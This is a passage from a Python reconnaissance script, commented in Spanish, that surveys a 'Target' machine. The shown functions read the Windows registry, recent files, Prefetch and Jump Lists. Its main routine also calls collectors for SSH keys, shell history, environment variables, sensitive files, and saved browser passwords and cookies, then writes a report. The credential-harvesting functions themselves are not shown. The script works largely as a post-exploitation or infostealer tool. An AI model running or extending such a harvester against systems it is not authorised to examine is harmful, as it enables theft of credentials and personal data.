                            dv, _, _ = winreg.QueryValueEx(subkey, "DisplayVersion")
                            print(f"    {str(dn)[:50]:<52} v{dv}")
                            entries[subkey_name] = f"{dn} v{dv}"
                        except OSError:
                            pass
                        winreg.CloseKey(subkey)
                    except OSError:
                        pass
                    idx += 1
                except OSError:
                    break
            winreg.CloseKey(key)
            data[label] = entries
        except PermissionError:
            print("    [!] Acceso denegado")
        except FileNotFoundError:
            print("    [-] Clave no encontrada")
        except OSError as e:
            print(f"    [!] Error: {e}")

    REPORT["registro_windows"] = data


# ─────────────────────────────────────────
# 27. ACTIVIDAD RECIENTE + PREFETCH
# ─────────────────────────────────────────
def get_recent_activity():
    print(f"\n{SEPARATOR}\n[+] ACTIVIDAD RECIENTE DEL USUARIO\n{SEPARATOR}")
    data = {"recientes": [], "prefetch": [], "jump_lists": []}

    recent_dir = os.path.join(USERPROFILE, "AppData", "Microsoft", "Windows", "Recent")
    if os.path.exists(recent_dir):
        files = sorted(
            os.listdir(recent_dir),
            key=lambda fname: os.path.getmtime(os.path.join(recent_dir, fname)),
            reverse=True
        )
        print(f"\n  [Archivos Recientes] ({len(files)} entradas):")
        for fname in files[:40]:
            fpath = os.path.join(recent_dir, fname)
            mtime = datetime.datetime.fromtimestamp(os.path.getmtime(fpath))
            data["recientes"].append({"archivo": fname, "modificado": str(mtime)})
            print(f"    [{mtime}] {fname}")

    prefetch_dir = r"C:\Windows\Prefetch"
    if os.path.exists(prefetch_dir):
        try:
            pf_files = sorted(
                os.listdir(prefetch_dir),
                key=lambda fname: os.path.getmtime(os.path.join(prefetch_dir, fname)),
                reverse=True
            )
            print(f"\n  [Prefetch] ({len(pf_files)} entradas):")
            for pf in pf_files[:40]:
                fpath = os.path.join(prefetch_dir, pf)
                mtime = datetime.datetime.fromtimestamp(os.path.getmtime(fpath))
                data["prefetch"].append({"archivo": pf, "ultimo_uso": str(mtime)})
                print(f"    [{mtime}] {pf}")
        except PermissionError:
            print("  [!] Prefetch requiere permisos de Administrador")

    jump_dir = os.path.join(
        USERPROFILE, "AppData", "Roaming",
        "Microsoft", "Windows", "Recent", "AutomaticDestinations"
    )
    if os.path.exists(jump_dir):
        jl_files = os.listdir(jump_dir)
        data["jump_lists"] = jl_files
        print(f"\n  [Jump Lists] — {len(jl_files)} entradas")

    REPORT["actividad_reciente"] = data


# ─────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────
def main():
    banner()
    print(f"\033[93m[*] Inicio:  {datetime.datetime.now()}\033[0m")
    print(f"\033[93m[*] Target:  {socket.gethostname()}\033[0m\n")

    get_os_info()
    get_user_info()
    get_cpu_info()
    get_memory_info()
    get_disk_info()
    get_network_info()
    get_connections()
    get_arp_and_routes()
    get_dns_info()
    get_processes()
    get_listening_ports()
    get_system_users()
    get_groups_and_sudo()
    get_env_vars()
    get_ssh_info()
    get_history()
    get_installed_software()
    get_firewall_rules()
    find_sensitive_files()
    get_public_ip()
    get_scheduled_tasks()

    if platform.system() == "Windows":
        get_browser_history()
        get_browser_passwords()
        get_browser_cookies()
        get_registry_artifacts()
        get_recent_activity()

    save_report()

    print(f"\n{SEPARATOR}")
    print("\033[92m[✓] Reconocimiento completado.\033[0m")
    print(SEPARATOR)


if __name__ == "__main__":
    main()
